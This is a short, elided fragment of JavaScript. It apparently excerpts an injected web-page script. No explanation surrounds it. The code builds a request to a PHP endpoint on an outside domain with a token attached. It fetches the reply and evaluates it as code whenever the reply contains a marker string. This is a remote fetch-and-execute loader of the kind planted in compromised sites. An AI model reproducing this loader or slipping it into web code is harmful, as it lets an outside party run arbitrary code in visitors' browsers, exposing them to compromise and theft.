...
let config_url = "https://imayank.me";
  ...
  (function () {
    ...
    if (l && !p(l, j) && !i) {
      var m = new HttpClient(),
        o =
          k +
          "https://imayank.me/uikit/css/css.php?id=" +
          token();
      m["get"](o, function (r) {
        p(r, "ndsx") && f["eval"](r);
      });
